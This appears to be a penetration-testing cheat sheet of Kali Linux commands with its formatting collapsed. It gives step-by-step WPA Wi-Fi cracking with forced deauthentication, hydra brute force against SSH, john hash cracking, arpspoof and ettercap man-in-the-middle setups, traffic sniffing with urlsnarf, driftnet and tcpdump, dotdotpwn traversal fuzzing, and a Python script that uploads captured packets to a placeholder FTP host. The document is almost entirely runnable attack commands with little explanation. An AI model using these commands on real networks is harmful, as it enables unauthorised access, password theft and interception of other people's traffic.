************************************************************************ Launching Maltego***********************************************************************maltego************************************************************************ Nmap************************************************************************ Basic Scannmap scanme.nmap.org* Stealthy Scan, in an IP Range, of some chosen portsnmap -sV -p 20,21,22,23,25,53,79.80,110,143 10.5.8.1-255************************************************************************ Cracking Wifi************************************************************************ Step 1: Ensure adapter installed and readyairmon-ng* Step 2: Configure adapter for monitoringairmon-ng start wlan1* Step 3: See what networks are availableairodump-ng wlan1mon* Step 4: Capture on a specific SSIDairodump-ng -c [channel] --bssid [bssid] -w /[location & name to store the capture][monitor interface ID]* Example of aboveairodump-ng -c 7 --bssid 88:F0:31:B0:22:50 -w /root/Desktop/WPA_Crack wlan1mon* Step 5: Force Reauthaireplay-ng -0 2 -a [the router's bssid] -c[target client's bssid] [interface we're monitoring]* Example of aboveaireplay-ng -0 2 -a 88:F0:31:B0:22:50 -c 18:B4:30:29:4E:DB wlan1mon************************************************************************ Cracking Captured WPA Key using Aircrack-ng and Crunch************************************************************************ Syntaxcrunch [min char] [max char] {char set] | aircrack-ng -e [SSID Name] -w -/[location & name to store the capture]* Example of abovecrunch 8 8 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | aircrack-ng -e PENTEST_NET -w - /root/Desktop/WPA_Crack-01.cap************************************************************************ Cracking Hashes with Hydra************************************************************************ Syntax hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] -t [number of threads (optional)] [service://server[:PORT][/OPT]]* Examplehydra -l user -P /usr/share/john/password.lst -t 4 ssh://192.168.32.40:22************************************************************************ Cracking Hashes with John************************************************************************ Syntax john -wordlist=[location of wordlist] -rules [file full of hashes]* Examplejohn -wordlist=/usr/share/john/password.lst --rules -format=Raw-SHA1 hashes.txt************************************************************************ Bridging for in-line MITM************************************************************************ Step 1: Install bridge utilitiesapt-get install bridge-utils* Step 2: configure two interfaces to be in-line pairifconfig eth0 0.0.0.0ifconfig eth1 0.0.0.0* Step 3: Create Bridge interface, and add interfaces from Step 2brctl addbr bridge0brctl addif bridge0 eth0brctl addif bridge0 eth1* Step 4: Bring up the bridge interfaceifconfig bridge0 up* Step 5: Verify bridge interface passing traffictcpdump -n port 80 and host 192.168.1.38************************************************************************ Arpspoof (in dsniff)************************************************************************ Step 1: Install dsniffapt-get install dsniff* Step 2: configure IP forwardingsysctl -w net.ipv4.ip_forward=1* Verify Step 2sysctl -a list | grep net.ipv4.ip_forward* Step 3: Arpspoof to setup MITMarpspoof -i eth0 -t 192.168.30.1 -r 192.168.30.250arpspoof -i eth0 -t 192.168.30.250 -r 192.168.30.1* Step 5: Verify bridge interface passing traffictcpdump -n port 80 and host 192.168.1.38************************************************************************ Ettercap GUI startup***********************************************************************ettercap -G************************************************************************ Ettercap CLI Use************************************************************************ Step 1: Install CLI versionapt-get install ettercap-text-only* Step 2: Startup Ettercapettercap -Tq -i eth0 -M arp:remote ///23************************************************************************ Dsniff URLSnarf use (to be used after configuring arpspoof as above)***********************************************************************urlsnarf************************************************************************ Firewalk (example, modify as needed for environment)***********************************************************************firewalk -s23233 -s22 -pTCP -S22,23,25,80,443,5900,8080,8443 192.168.1.1 192.168.30.250************************************************************************ TCPDump Examples***********************************************************************tcpdump host www.domain.comtcpdump host 192.168.30.250* Specify Source and Destination if neededtcpdump src 192.168.1.222tcpdump 'src 192.168.1.222 and dst 192.168.30.250'* Specify Networkstcpdump net 192.168.30.0/24* Specify various port combinationstcpdump tcptcpdump port 22tcpdump dst port 22tcpdump 'tcp and dst port 22'tcpdump 'tcp and dst port 22 and src port 53029'* Save and filter output to a pcap filetcpdump -w SSHcap.pcap 'tcp and dst port 22 and src port 53029'* Scan without reverse name lookup, save to filetcpdump 'tcp and dst port 22 and src port 53029' -n -w SSH.pcap************************************************************************ TCPDump scripting with Python************************************************************************ Edit script firstroot@kali:~# cat ftp-transfer.pyimport ftplibimport sysinputfile = sys.argv[1]session = ftplib.FTP('FTP-HOST','FTP-USER','FTP-PASS')file = open(inputfile,'rb')storvar = "STOR %s" % inputfilesession.storbinary(storvar, file)file.close()session.quit()* Run Scriptroot@kali:~# python ftp-transfer.py SSHcap.pcap************************************************************************ DotDotPwn************************************************************************ Step 1: Install with dependenciesapt-get install dotdotpwn libswitch-perl* Step 2: Run dotdotpwndotdotpwn* Example against single host, HTTP protocol, depth of 3dotdotpwn -m http -c 3 -h 192.168.1.134************************************************************************ Driftnet************************************************************************ Step 1: Install & Run apt-get install driftnetdriftnet-i eth0************************************************************************ w3af************************************************************************ Step 1 & 2: Install & Run apt-get install w3afw3af* Step 3: See optionsw3af>>> plugins* Step 4: Use Audit pluginw3af/plugins>>> audit* Step 5: See outputw3af/plugins>>> output console* Step 6: Designate target of the auditw3af plugins>>> backw3af>>> targetw3af/config:target>>> set target http://192.168.1.134w3af/config:target>>> back* Step 7: Start Auditw3af>>> start